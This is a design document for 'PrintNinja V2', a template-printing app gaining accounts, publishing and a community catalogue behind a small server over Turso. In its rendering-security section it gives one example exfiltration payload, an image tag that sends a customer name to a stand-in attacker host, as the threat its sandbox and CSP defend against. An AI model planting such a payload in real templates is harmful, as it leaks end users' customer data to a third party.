# PrintNinja V2 — Shared Templates

Status: **phases 1–2 (B1–B4) implemented; phase 3 not started**
Branch: `v2`
Shipped as three releases: **`0.2.0`** (local README + safe rendering), **`0.3.0`**
(accounts + publish), **`0.4.0`** (browse + save). See §11.

This revision replaces the earlier "Turso embedded replica" design. The reasons are in §4.1 and
the decision record in §14; the short version is that replicating a shared database to every
client cannot be made private, and the thin-server design is both safer and smaller.

---

## 1. What changes

PrintNinja V1 keeps everything in a per-machine SQLite file. Templates are invisible to
everyone but the person who drew them. **That stays true.** Your working templates remain local
files that work offline.

V2 adds a small hosted service, backed by **Turso (libSQL)**, that holds only *published*
templates, and three things on top:

1. **Accounts**, so a published template has an owner.
2. **Publish**, an explicit action that uploads a copy. Drafts never leave your machine.
3. **A markdown README** on every template, so other people know how to use it.

That's the whole product change.

### The loop

```
   your machine                          hosted service (Turso)
 ┌──────────────────┐   publish ──────▶ ┌─────────────────────┐
 │  Mine (local)    │                   │  Published          │
 │  drafts + live   │                   │  templates + README │
 └──────────────────┘                   └──────────┬──────────┘
 ┌──────────────────┐   save (copy) ◀───────────── │ browse
 │  Saved (local,   │                              │
 │  read-only copy) │                              ▼
 └──────────────────┘                        Community
```

Browse and publish go over the network. Everything else, including printing a saved
template, is local.

## 2. Goals

| Goal | Done when |
|------|-----------|
| Templates are shared | A new install lists templates published from another machine |
| You own what you publish | You can update or unpublish yours; you cannot touch anyone else's |
| Anyone can use published templates | You can print a template you saved from someone else |
| Every template has a README | New templates get a usable scaffold, not a blank box |
| Drafts are private by construction | A draft has no server row, so there is nothing to leak |
| Anyone can browse | You can find other people's templates and save them |
| Colour directs attention | Ownership and state are readable without reading text |
| Works offline | Designing and printing never need the network |

## 3. Not doing

This is the anti-complexity contract. Anything here stays out until someone asks.

- **Forking, lineage, "update available" tracking.** Saving takes a read-only copy. If you want
  to change it, make your own. No pin-vs-track, no fork button.
- **Replicating the database to clients.** See §4.1. Clients talk to an API, never to Turso.
- **Local-first sync of the shared database.** No sync engine, no conflict resolution, no
  `sync_log`.
- **Per-template collections.** One saved list. No names, folders or notes.
- **An ORM.** Flat CRUD on two small schemas doesn't need one.
- **Multi-dialect SQL.** One engine (libSQL) on the server, SQLite locally.
- **Version history and version freezing.** Publish uploads the current state; that's it.
- **Moderation queue, report button, abuse programme.** Open community, handle problems when
  they happen. The one exception is a small login throttle (§6), because a hosted login form
  is brute-forceable and the throttle is a few lines.
- **Email, password recovery, avatars.** Handle and password, nothing else.
- **Categories and facets.** Sort and search by name and summary only.
- **Slugs and shareable links.** Templates are addressed by id.
- **Ratings, comments, follows, messaging, payments.**

## 4. Architecture

### 4.0 Which operations need a network

| Operation | Network |
|-----------|---------|
| Create / edit / delete / print your own templates | no |
| Edit a README | no |
| Print a template you saved | no |
| Sign up / sign in | yes |
| Publish, update or unpublish | yes |
| Browse the community catalogue | yes |
| Save someone else's template | yes (one download; afterwards it's local) |

No network means the shared features say so and everything else works. There is no sync loop
and no background connection.

### 4.1 Why a thin server, not a Turso replica

The earlier draft put a local libSQL replica in every app and let it sync with a shared Turso
database. That doesn't survive contact with the requirements:

1. **Sync copies the whole database.** Every install would hold everyone's `password_hash`,
   every `sessions.token`, and every draft. Authorization rules like "drafts return 404" can't
   be enforced when the client can read the raw tables.
2. **The token ships in the app.** Anything in `TURSO_AUTH_TOKEN` can be extracted from a
   desktop or Android build and used to read or drop the database.
3. **The sync model wasn't what the draft assumed.** Standard embedded replicas read locally
   and send writes to the cloud primary
   ([Turso Rust SDK reference](https://docs.turso.tech/sdk/rust/reference.md)). Local-first
   writes are the separate
   [Offline Writes](https://turso.tech/blog/introducing-offline-writes-for-turso) feature,
   which was in private beta when announced. Neither says whether a second SQLite driver may
   write the same file, which the earlier plan relied on.
4. **Phase ordering leaked data.** Turning on sync in the first release would have uploaded
   every user's private templates before any ownership model existed.

The fix is to keep Turso behind a server:

```
 ┌───────────────┐   HTTPS + session token   ┌───────────────┐   libsql   ┌───────┐
 │ PrintNinja    │ ────────────────────────▶ │ share service │ ─────────▶ │ Turso │
 │ (Tauri app)   │ ◀──────────────────────── │ (small axum)  │            └───────┘
 │ local SQLite  │                           └───────────────┘
 └───────────────┘     holds TURSO_AUTH_TOKEN; the app never sees it
```

- The **app** keeps its V1 local SQLite file and its existing query layer. Nothing about
  printing or designing changes.
- The **share service** owns accounts, sessions and published templates, and is the only thing
  holding a Turso token. Every permission in §6 is enforced there, in one place.
- The app's only new dependency is an HTTP client.

This removes the largest and riskiest item in the earlier plan: converting all 103 local query
sites to async and swapping the driver. Local code is not touched except for a few guarded
`ALTER TABLE` columns (§5.1).

### 4.2 Draft and publish are the same idea as "local" and "shared"

A template is **a draft** if it exists only on your machine, and **published** once you have
pushed a copy to the service. There is no `status` column on the server, because the server
only ever holds published templates.

- **Publish** uploads the current name, summary, page settings, HTML/CSS body and README. The
  app generates the template's UUID the first time and remembers it in `remote_id`.
- **Update** is the same action again. Last publish wins; the server stamps `updated_at`, not
  the client, so clock skew doesn't matter.
- **Unpublish** deletes the server row. Your local template is untouched, so you can republish.
- Editing a local template that is already published does **not** change what other people
  see until you publish again. This replaces the earlier "everyone gets your edits on next
  sync" cost and the warning strip that existed to soften it.

### 4.3 Saving is a copy, not a pointer

Saving a template downloads the published version and stores it as a **read-only local row**
with `origin = 'saved'` and the author's handle. From then on it prints offline and cannot
change under you.

Consequences, all of them simplifications:

- No "not downloaded yet" state. If you have it, you have the body.
- Printing someone else's template can't be altered or withdrawn mid-job. If the author
  unpublishes, your copy keeps working; the card shows a slate **"withdrawn by author"** note
  (see §9.2) so you know it will not update.
- The server's `saved_templates` table is just your list of ids, so a second device can restore
  your Saved tab by downloading those templates again.
- A saved copy has no edit controls. This isn't forking: there is no lineage and no way to
  derive and republish it as "yours with changes". If you want a variant, you make a template.

### 4.4 Identity of templates

Local templates keep their `INTEGER` primary key, so no existing foreign key changes. The
server identifies templates by **UUID**, generated by the app at first publish and stored in
`templates.remote_id`. Two machines creating templates offline can no longer collide, because
local ids never leave the machine.

## 5. Data model

### 5.1 Local (app SQLite)

Additive and idempotent. SQLite has no `ADD COLUMN IF NOT EXISTS`, so each `ALTER` is guarded
by a `PRAGMA table_info` check, and a test runs the schema twice and asserts nothing changes.

```sql
ALTER TABLE templates ADD COLUMN readme        TEXT NOT NULL DEFAULT '';
ALTER TABLE templates ADD COLUMN summary       TEXT NOT NULL DEFAULT '';
ALTER TABLE templates ADD COLUMN remote_id     TEXT;            -- uuid once published
ALTER TABLE templates ADD COLUMN published_at  TEXT;            -- server's updated_at at last publish
ALTER TABLE templates ADD COLUMN origin        TEXT NOT NULL DEFAULT 'own'
    CHECK(origin IN ('own','saved'));
ALTER TABLE templates ADD COLUMN origin_owner  TEXT;            -- author handle, saved copies only
ALTER TABLE templates ADD COLUMN withdrawn     INTEGER NOT NULL DEFAULT 0;  -- saved, since unpublished

CREATE INDEX IF NOT EXISTS idx_templates_remote ON templates(remote_id);
```

There are no users, sessions or ownership tables locally. **The device has no concept of an
owner**; ownership exists only on the server, so there is no hidden implicit user and nothing
to claim when someone signs up. Existing V1 templates are simply `origin = 'own'`, unpublished.

The session token and the service URL are stored in the app's local settings. If no service URL
is configured, the sharing UI is hidden and the app behaves exactly like V1. Forks and
development builds need no secrets.

### 5.2 Server (Turso)

Owned by the share service; the app never connects to it.

```sql
CREATE TABLE IF NOT EXISTS users (
    id            TEXT PRIMARY KEY,                       -- uuid
    handle        TEXT NOT NULL UNIQUE COLLATE NOCASE,
    password_hash TEXT NOT NULL,                          -- scrypt, per-user salt
    created_at    TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS sessions (
    token_hash TEXT PRIMARY KEY,                          -- sha-256 of the opaque token
    user_id    TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    expires_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS templates (
    id          TEXT PRIMARY KEY,                         -- uuid, client-generated
    owner_id    TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    name        TEXT NOT NULL,
    summary     TEXT NOT NULL DEFAULT '',
    page_w_mm   REAL NOT NULL,
    page_h_mm   REAL NOT NULL,
    language    TEXT NOT NULL,
    body        TEXT NOT NULL,                            -- the template HTML/CSS (≤ 512 KB)
    readme      TEXT NOT NULL DEFAULT '',                 -- markdown (≤ 64 KB)
    use_count   INTEGER NOT NULL DEFAULT 0,
    published_at TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at   TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX IF NOT EXISTS idx_tpl_owner   ON templates(owner_id);
CREATE INDEX IF NOT EXISTS idx_tpl_updated ON templates(updated_at);

CREATE TABLE IF NOT EXISTS saved_templates (
    user_id     TEXT NOT NULL REFERENCES users(id)     ON DELETE CASCADE,
    template_id TEXT NOT NULL REFERENCES templates(id) ON DELETE CASCADE,
    added_at    TEXT NOT NULL DEFAULT (datetime('now')),
    PRIMARY KEY (user_id, template_id)
);
```

Three notes:

- **No `status`, no `owner_id` backfill, no `template_versions`.** A row's existence is its
  published state. The earlier draft referenced `template_versions` without defining it; it is
  gone.
- **`use_count` is safe here** because the server is the only writer and increments it
  atomically (`SET use_count = use_count + 1`). The earlier design had other people's prints
  writing to the owner's synced row, which fought owner-only edits.
- **Hashing sessions** means a leaked database dump doesn't hand out live logins.

Deleting a template deletes its `saved_templates` rows, but savers keep their local copy
(§4.3), so unpublishing is not destructive to anyone who already saved it.

## 6. Who can do what

Enforced by the service, in one function so it can't drift between endpoints:

| Action | Owner | Anyone signed in | Anonymous |
|--------|-------|------------------|-----------|
| Browse / read a published template and README | yes | yes | yes |
| Publish a new template | yes | yes | no |
| Update, unpublish | yes | **no** (`403`) | no |
| Save to your list | n/a | yes | no |
| Unsave / read your saved list | own rows only | own rows only | no |
| Record a print (`use`) | yes | yes | no |
| Print a saved copy | local, no check | local | local |

A template that doesn't exist (never published, or unpublished) is `404`. Unlike the earlier
draft there is no "draft" row to hide, so the 404-vs-403 subtlety goes away: the only secret
data is on your own disk.

Accounts: signing up is open, handle plus password, no invite and no email. Passwords are
scrypt with a per-user salt and constant-time compare. Sessions are opaque random tokens with
an expiry, sent as a bearer token over HTTPS only. **Login and register are throttled per
handle and per IP** (proposed: 5 attempts/minute), which is the single abuse control this
version includes.

The existing `api_clients` API keys and the opt-in LAN bind in `commands/api.rs` are a
**local** feature and are unchanged. The hosted API is a separate service.

## 7. Migrating V1 data

There is nothing to migrate. V1 templates stay exactly where they are and stay private.

On first V2 launch the app runs the guarded `ALTER`s from §5.1 and fills `readme` for each
existing template with the scaffold from §8.1, **Placeholders** pre-filled from the `{{…}}`
tokens actually present in the stored HTML. That is the one genuinely useful migration step.
It runs in a single transaction and is a no-op the second time.

### The "not published yet" strip

In the Designer, when a template has a `remote_id` and `updated_at > published_at`, show an
amber strip: *"You have changes that aren't published. Other people still see the version
from 14 Oct."* It replaces the old "your edits are reaching people" warning and is now purely
informative; nothing leaks while it's showing.

## 8. The README

### 8.1 Default scaffold

`create_template` writes this, so a new template starts with structure rather than a blank
box. (Outermost fence is four backticks because the scaffold itself contains a fenced block.)

````markdown
# {{template_name}}

<!-- One line: what is this template for? -->

## What it prints
<!-- e.g. An 80mm thermal receipt with items, totals and a QR code. -->

## Data contract
<!-- The JSON keys this template reads. Keep in sync with Placeholders. -->

```json
{
  "store":  { "name": "", "address": "" },
  "order":  { "number": "", "date": "" },
  "items":  [ { "name": "", "qty": 1, "price": 0.0, "total": 0.0 } ],
  "totals": { "subtotal": 0.0, "tax": 0.0, "total": 0.0 }
}
```

## Placeholders
<!-- Which {{helper}} produces which field. -->

## Printer requirements
- Paper:
- Language:
- DPI:
- Margins:

## Changelog
- v1 — initial version
````

The `{{template_name}}` token is substituted at creation.

### 8.2 Rendering and editing

- **Render** with `react-markdown` + `remark-gfm`. Pure JS, works in the WebView and in a
  browser. Raw HTML stays off (`rehype-raw` is not installed), which is what makes a
  user-written README safe to show to other users. Links open in the system browser and are
  limited to `http`, `https` and `mailto`.
- **Edit** in a split source/preview pane on `lg`+, tabbed on mobile, with a **Reset to
  scaffold** action that warns first.
- **Toolbar** wraps the selection in Markdown: bold, heading, link, code, list, quote. No
  WYSIWYG.
- **Cap** at 64 KB, validated in Rust locally and again by the service.

### 8.3 Rendering other people's templates is the real security surface

A README is inert text. A template **body** is HTML and CSS written by a stranger, and with
sharing you will render it in a WebView next to your customers' data. Two things have to be
true before anything is published or saved:

1. **It cannot run code or reach Tauri.** Preview and print rendering happen in a sandboxed
   iframe with no `allow-scripts`, no `allow-same-origin`, and no access to IPC. Scripts and
   event-handler attributes are stripped on publish *and* on save, so a bad row on the server
   doesn't depend on every client doing it right.
2. **It cannot send data anywhere.** A template such as
   `<img src="https://evil.example/?{{customer.name}}">` would leak the *user's customers* to
   the template's author. The render context uses a CSP of `default-src 'none'; img-src data:;
   style-src 'unsafe-inline'; font-src data:` and published bodies containing remote
   `url(...)`/`src`/`href` references are rejected, with a clear message pointing at
   `data:` URIs.

This is why the first release (§11, Phase 1) ships the hardened render path **before** any
network feature exists. It is the part that has to be correct, and it is easier to audit while
the only thing it renders is your own HTML.

## 9. Interface

### 9.1 Colour means something

V1 uses one accent for everything, so a destructive delete and a "print now" button look
identical. V2 gives each meaning one hue and adds no colours beyond these:

| Token | Hue | Means | Used for |
|-------|-----|-------|----------|
| `--primary` | cyan `199 89% 48%` | **Your** action | Print, Save template, Sign in |
| `--success` | emerald `160 84% 39%` | Published | Published badge, Publish button |
| `--warning` | amber `38 92% 50%` | Draft (local only), unpublished changes | Draft badge, changes strip |
| `--info` | violet `265 83% 53%` | Someone else's, which you've kept | ★ Saved, saved copies |
| `--destructive` | rose `0 84% 60%` | Irreversible | Delete, Unpublish, Sign out everywhere |
| `--muted` | slate | Read-only | Disabled, secondary text, README prose |

Cyan is "yours" and violet is "theirs, and you kept a copy". They are different hues on
purpose — two actions differing only in lightness read as the same action in two states.

### 9.2 Template cards

A 4 px coloured left edge is the first thing your eye lands on. Everything else follows from
that one fact:

```
┌─┃─ Invoice A4                        [ Published ]
│  ┃   A4 tax invoice, 3-column totals   Alice · 142 prints
│  ┃   210 × 297 mm · A4 · HTML/CSS
│  ┃   ─────────────────────────────────────────────
│  ┃   [ Use ]   [ ★ ]   [ Readme ]
```

| Edge | Means | Actions |
|------|-------|---------|
| Cyan | Yours, published | Edit, Duplicate, Update published copy, Unpublish, Delete |
| Amber | Yours, draft (only on this device) | Primary button reads **Publish**; subtitle says only you can see it |
| Emerald | Someone else's, in Community | Primary button reads **Save**. No edit control at all. |
| Violet | Saved copy of someone else's | **Print**. Read-only; no Edit |
| Slate | Saved copy the author has since withdrawn | **Print** still works; badge says "withdrawn by author" |

An absent button beats a disabled one — showing an Edit you can't have wastes the space and
invites the click.

### 9.3 The library page

`/templates`, three tabs:

```
┌──────────────────────────────────────────────────────────────────┐
│  Templates                                                       │
│  [ Community ]  [ Mine ]  [ ★ Saved ]                            │
│  [ Search name…                    ]        [ Most used ▾ ]       │
├──────────────────────────────────────────────────────────────────┤
│  ┃ Invoice A4              │  ┃ Packing Slip 4×6                │
│  ┃ [Published] Alice       │  ┃ [Draft] you                    │
│  ┃ A4 tax invoice…  142↵   │  ┃ Packing slip for parcels…      │
│  ┃ ★ Saved                  │                                   │
└──────────────────────────────────────────────────────────────────┘
   1 col mobile · 2 col md · 3 col xl
```

- **Community** — every published template from every user, with owner handle, summary, page
  size, language and print count. Needs network; offline it shows an offline state instead of
  an error.
- **Mine** — your local templates, drafts included, with the full action row.
- **Saved** — your read-only copies, printable straight from here, fully offline.

Search matches name and summary. Sort is Recently updated / Most used / A–Z, where "most
used" is `use_count`, incremented when a saved copy is printed rather than on view so it
reflects real use. Recording a print is best-effort and silent if offline.

An empty Saved tab isn't dead space — it points at Community.

### 9.4 The star

| State | Shows |
|-------|-------|
| Not saved | `☆` outline, tooltip "Save to your list" |
| Saved | `★` filled, `aria-pressed="true"`, violet |
| Saving | Filled immediately with a spinner |
| Failed | Reverts to `☆`, toast with Retry |
| Your own template | No star at all |

Saves are **optimistic**: the star fills instantly, the download goes out in the background,
and a failure reverts it with a toast. Waiting on a round trip makes the control feel broken
on a phone.

### 9.5 Designer

Three panes on `xl`, tabs on mobile: `Design | Code | README | Preview`.

- Header shows a fixed **state chip** — `Draft` amber or `Published` emerald — so it never
  shifts position as you type.
- **Publish** is the one emerald button in the app, which is what makes it read as the
  consequential action. For a published template it reads **Update published copy**.
- **README** is a tab next to the canvas, so docs get written beside the template rather than
  somewhere else.
- The amber "not published yet" strip from §7 sits under the header.

## 10. The share service API

A separate hosted service, versioned `/v1`. It is unrelated to the app's local REST API in
`api/routes.rs`, which is unchanged.

```
POST   /v1/auth/register      { handle, password }            → { token, user }
POST   /v1/auth/login         { handle, password }            → { token, user }
POST   /v1/auth/logout        Bearer                          → 204
GET    /v1/auth/me            Bearer                          → { user }

GET    /v1/templates          ?q=&sort=updated|used|name&page=  → [TemplateSummary]   public
GET    /v1/templates/{id}     → Template (body + README)       public
PUT    /v1/templates/{id}     owner only; creates or updates   → Template
DELETE /v1/templates/{id}     owner only                       → 204
POST   /v1/templates/{id}/use Bearer                           → 204   (best-effort)

GET    /v1/saved              Bearer                           → [TemplateSummary]
PUT    /v1/saved/{id}         Bearer                           → 200   (idempotent)
DELETE /v1/saved/{id}         Bearer                           → 204
```

- `PUT /v1/templates/{id}` with a client-generated UUID is both publish and update, so there is
  no create/update branch on the client and a retried request can't create a duplicate.
- `PUT /v1/saved/{id}` is idempotent: optimistic UI plus retry will double-send, and pressing ★
  twice must not produce an error.
- The existing local API's paths and the `GET /v1/templates` default are **not** changed, so
  there is no breaking-change line for the changelog.
- Request bodies are size-checked before parsing: template body ≤ 512 KB, README ≤ 64 KB. The
  service re-sanitizes template HTML on write (§8.3).

## 11. Phases and batches

Six batches in three phases. **Each phase ends at a release you can ship**, so there is a
working version at every boundary — not six half-features and one big reveal.

| Phase | Batches | User-visible outcome | Ship as |
|-------|---------|---------------------|---------|
| **1 — Local** | B1, B2 | Every template has a README; other people's HTML can't hurt you. No network. | `0.2.0` |
| **2 — Identity & publish** | B3, B4 | You can sign up and publish, update and unpublish your templates | `0.3.0` |
| **3 — Sharing** | B5, B6 | You can browse everyone's published templates, save them, and print from your Saved tab | `0.4.0` |

Phase 1 is useful on its own and carries no server risk: a README helps even a single-user
install, and the hardened render path is the part that must be right before strangers' HTML
can arrive. Phase 2 stands alone — a user could publish their templates and never touch anyone
else's. Phase 3 depends on both, because browsing only makes sense once publishing works and
rendering is safe.

### The batches

Each ends green on lint, build and tests.

| # | Batch | Work | Gate |
|---|-------|------|------|
| B1 | Local schema + README | Guarded `ALTER`s (§5.1), scaffold generator, placeholder extraction for existing templates, README tab with markdown render + edit, 64 KB cap | Scaffold has every heading; V1 DB migrates in one transaction and a second run changes nothing; XSS payload in a README renders as text |
| B2 | Safe rendering | Sandboxed iframe + CSP for preview/print (§8.3), script/handler stripping, remote-reference check | A body with `<script>`, `onerror=`, and a remote `<img>` renders inert and makes no request; existing 105 tests green |
| B3 | Service + accounts | `server/` crate, Turso schema (§5.2), register/login/logout/me, scrypt, hashed sessions, login throttle, deploy | Wrong password, expired session and unknown handle fail correctly; throttle trips; token never appears in a client build |
| B4 | Publish | `PUT/DELETE /v1/templates/{id}`, permission function, app publish/unpublish/update, state chip, "not published yet" strip | One test per owner/non-owner row of §6; republish is idempotent; unpublish leaves the local template intact |
| B5 | Browse | `GET /v1/templates`, search + sort, Community tab, cards, `use` counter | Anonymous browse works; counts increment atomically; offline shows an offline state |
| B6 | Save + docs | `/v1/saved/*`, snapshot download as read-only local row, Saved tab, star, "withdrawn" state, `README.md`, `CHANGELOG.md` | Save is idempotent; saved copy prints with no network; unpublishing doesn't break a saved copy |

### Optional hygiene, not a gate: named column reads

The earlier review of the local code found 137 positional `row.get(N)` reads and no named
ones, and verified that a reordered `SELECT` over two same-typed columns returns a **wrong value
with no error**, while `row.get("col")` is immune. That finding stands. It is no longer a
release-blocking refactor: convert reads to `row.get("col")` whenever a function is touched,
and add the regression test (two same-typed columns selected out of order must still map
correctly) in B1 so new positional reads get caught.

### Where the risk is

| Batch | Risk | Why | Mitigation |
|-------|------|-----|------------|
| B2 | **High** — security | Renders HTML written by strangers next to customer data | Ships first and alone, with tests for script execution and outbound requests; sanitized again on the server |
| B3 | **High** — first hosted surface | Passwords, sessions, a public endpoint | scrypt + constant-time compare, hashed session tokens, throttle, HTTPS only, Turso token held only server-side |
| B4 | Medium | First write path to shared data | Owner check in one function; idempotent `PUT`; unpublish is non-destructive locally |
| B1, B5, B6 | Low | Additive, well-understood patterns | Standard gates |

**B2 is the batch to do slowly.** Everything else is ordinary feature work; that one decides
whether opening someone else's template can leak your customers' data.

### What can be cut

Phase 3 is the part that can slip without touching the architecture. Within it, the sort
dropdown, the "withdrawn" badge and use counts are all removable. Phases 1 and 2 are the
foundation.

## 12. Tests

**Rust (app)** — keep the existing split (62+16+13+9+5) and add:
- guarded schema runs twice with no change; every `ALTER` has a `table_info` check

## 13. Still needs an answer

None of these is design work.

1. **A Turso database and a host for the service.** Someone has to create the Turso org and
   database and choose where the small axum service runs. B3 depends on both. The Turso token
   is now a **server-side secret only**; it must never appear in the app, its config or CI
   artifacts for client builds.
2. **One Turso database or two?** Two (dev and prod) is safer and now costs little: it is just
   a different `TURSO_URL` on the server, with no client-side CI differences.
3. **Does `v2` build in CI?** The workflow currently runs on `main` only, so pushes to this
   branch are invisible until a PR opens. Add `v2` to the trigger branches before starting.
4. **Who can publish?** Open signup means anyone can publish anything. That is the stated
   contract (§3), but decide whether the first public build should start invite-only by
   shipping the service with signup disabled and flipping it later. It is one config flag.

## 14. Decision record

What changed from the earlier draft, and why, so nobody re-litigates it.

| Earlier | Now | Reason |
|---------|-----|--------|
| Turso embedded replica in every app | Hosted service in front of Turso | Whole-database sync exposes password hashes, sessions and drafts to every client; the Turso token would ship in the app |
| `rusqlite` + `libsql` on the same file | Local SQLite untouched; Turso only on the server | Driver safety on a shared replica file was unverified; the whole B1 async refactor disappears |
| `status` = draft/published, synced | Draft = local only; published = a server row | Privacy by construction; no status column, no backfill, no 404-vs-403 handling |
| Saving a pointer | Saving a read-only copy | Offline printing works trivially; no "not downloaded yet"; a template can't change under a running job |
| Publish edits reach everyone on next sync | Publish is an explicit action; unpublished edits stay local | The old design made the owner's edits instantly live and needed a warning strip to cope |
| `INTEGER` template ids across devices | Local `INTEGER`, remote UUID at first publish | Two offline devices would both create template `1` |
| Last-write-wins on client `updated_at` | Server stamps times | Client clocks are unreliable |
| `use_count` on a synced row | Server-side atomic counter | Other people's prints no longer write to the owner's row |
| Hidden implicit local user + backfill | No local users at all | Nothing to migrate or claim; V1 data is untouched |
| Hard cascade on delete (open question) | Unpublish deletes the server row; savers keep their copy | Answers the old "should delete be reversible" question without a purge window |
| B1: convert 103 sites to async, driver swap, 137 reads | Dropped; named reads become opportunistic hygiene | Highest-risk batch removed; the wrong-value-on-reorder finding is kept as a cheap test |
| README safety only | README **and** template-body sandbox + CSP | Strangers' HTML next to customer data is the actual attack surface |
| Phase 1 = no features | Phase 1 = local README + safe rendering | A release with user value and no server risk, and the render hardening lands before untrusted content can exist |
